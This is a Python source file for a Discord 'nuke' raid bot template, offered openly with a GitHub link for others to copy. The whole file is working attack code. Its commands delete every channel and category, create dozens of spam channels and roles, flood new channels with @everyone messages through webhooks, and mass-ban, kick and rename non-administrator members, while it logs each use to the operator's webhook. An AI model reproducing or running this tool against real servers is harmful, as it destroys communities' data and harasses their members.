import discord
from discord.ext import commands
import asyncio
import random


# ANC Nuke Bot Temp - Variables (edit as needed)
token = "token here"
prefix = "."
channel_names = ["nuked-1", "get-rekt-lmao", "bye-bye", "fucked", "🤡"]  # expand as you like
role_names    = ["Nuked", "lmao", "umm", "hey", "lol"]                     # expand as you like
spam_message  = "@everyone @here nuked"
spam_embed   = discord.Embed(title="lmao", description="no reclaimin this server🙏", color=0xff0000)
spam_embed.set_footer(text="anc temp if you want this too! https://github.com/anc-w/nuker-temp")
spam_embed.set_image(url="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnM5dzRla2RvOTh3NDl6MTgza2oxaGowb2lqamN4OHN5ZDc2bXNwZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Y5vIAXdbmnB72t5kus/giphy.gif")
members_needed = 10
log_hook = "https://discord.com/api/webhooks/..."   # ← your webhook for logging
protected_servers = [123456789012345678, 987654321098765432]  # server IDs to NEVER touch
cooldown = 5               # seconds
cooldown_bypass = [111222333444555666, 777888999000111222]   # user IDs
server_name = "name"
# needed_server = 999999999999999999   # optional: author must be in this server
# ────────────────────────────────────────────────

try:
    intents = discord.Intents.all()
except AttributeError:
    intents = None

if intents:
    bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)
else:
    bot = commands.Bot(command_prefix=prefix, help_command=None)

cooldowns = {}

@bot.event
async def on_ready():
    print(f'[ANC] Logged in as {bot.user} ({bot.user.id})')
    print('Nuker online – credits to ANC')

@bot.event
async def on_guild_join(guild):
    if guild.member_count < members_needed:
        print(f"[ANC temp] Left small server: {guild.name} ({guild.id})")
        await guild.leave()

@bot.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name="name")
        for _ in range(50):
            await asyncio.gather(
                webhook.send(spam_message, embed=spam_embed),
                channel.send(spam_message, embed=spam_embed)
            )
    except:
        pass

@bot.event
async def on_command(ctx):
    print(f"[ANC temp] {ctx.author} used .{ctx.command} in {ctx.guild}")
    try:
        hook = discord.Webhook.from_url(log_hook, session=discord.ClientSession())
        embed = discord.Embed(title="Command Used", color=0xff0000)
        embed.add_field(name="User", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.add_field(name="Guild", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
        embed.add_field(name="Command", value=ctx.command.name, inline=False)
        await hook.send(embed=embed)
    except:
        pass

def on_cooldown(author_id: int) -> bool:
    if author_id in cooldown_bypass:
        return True
    now = asyncio.get_event_loop().time()
    if author_id in cooldowns and now - cooldowns[author_id] < cooldown:
        return False
    cooldowns[author_id] = now
    return True

async def log_event(title: str, ctx):
    try:
        hook = discord.Webhook.from_url(log_hook, session=discord.ClientSession())
        embed = discord.Embed(title=title, color=0xff0000 if "Started" in title else 0x00ff00)
        embed.add_field(name="User", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.add_field(name="Guild", value=f"{ctx.guild.name} ({ctx.guild.id})", inline=False)
        await hook.send(embed=embed)
    except:
        pass
@bot.command()
async def nuke(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("Protected server – no nuke allowed.")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("Cooldown active. Chill.")
    await log_event("Nuke Started", ctx)
    
    tasks = []
    
    # Delete all channels & categories
    for ch in list(ctx.guild.channels):
        try:
            tasks.append(asyncio.create_task(ch.delete()))
        except:
            pass
    for cat in list(ctx.guild.categories):
        try:
            tasks.append(asyncio.create_task(cat.delete()))
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    tasks.clear()
    
    # Mass create channels
    for _ in range(50):
        name = random.choice(channel_names) + f"-{random.randint(1000,9999)}"
        try:
            tasks.append(asyncio.create_task(ctx.guild.create_text_channel(name)))
            await asyncio.sleep(0.03) # slight delay to let events catch up, 30ms delay
        except:
            pass
    
    # Mass create roles
    for _ in range(50):
        name = random.choice(role_names) + f"-{random.randint(100,999)}"
        try:
            tasks.append(asyncio.create_task(ctx.guild.create_role(name=name)))
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await log_event("Nuke Complete", ctx)


@bot.command()
async def deletechannels(ctx):
    if ctx.guild.id in protected_servers:
        return await ctx.send("Protected server – no delete allowed.")
    if not on_cooldown(ctx.author.id):
        return await ctx.send("Cooldown active. Chill.")
    
    await ctx.send("Deleting all channels...")
    count = 0
    tasks = []
    
    for ch in list(ctx.guild.channels):
        try:
            tasks.append(asyncio.create_task(ch.delete()))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def banall(ctx):
    if ctx.guild.id in protected_servers: return
    if not on_cooldown(ctx.author.id): return await ctx.send("Cooldown.")
    
    await ctx.send("Banning everyone possible...")
    count = 0
    tasks = []
    
    for m in list(ctx.guild.members):
        if m == bot.user or m.id in cooldown_bypass or m.guild_permissions.administrator:
            continue
        try:
            tasks.append(asyncio.create_task(m.ban(reason="ANC raid")))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"Banned **{count}** members.")

@bot.command()
async def kickall(ctx):
    if ctx.guild.id in protected_servers: return
    if not on_cooldown(ctx.author.id): return await ctx.send("Cooldown.")
    
    await ctx.send("Kicking remaining members...")
    count = 0
    tasks = []
    
    for m in list(ctx.guild.members):
        if m == bot.user or m.id in cooldown_bypass or m.guild_permissions.administrator:
            continue
        try:
            tasks.append(asyncio.create_task(m.kick(reason="ANC raid")))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"Kicked **{count}** members.")

@bot.command()
async def renameall(ctx):
    if ctx.guild.id in protected_servers: return
    if not on_cooldown(ctx.author.id): return await ctx.send("Cooldown.")
    
    await ctx.send("Renaming nicknames...")
    count = 0
    tasks = []
    
    for m in list(ctx.guild.members):
        if m == bot.user or not m.guild_permissions.change_nickname:
            continue
        try:
            tasks.append(asyncio.create_task(m.edit(nick="Nuked by ANC")))
            count += 1
        except:
            pass
    
    await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"Renamed **{count}** members.")


bot.run(token)
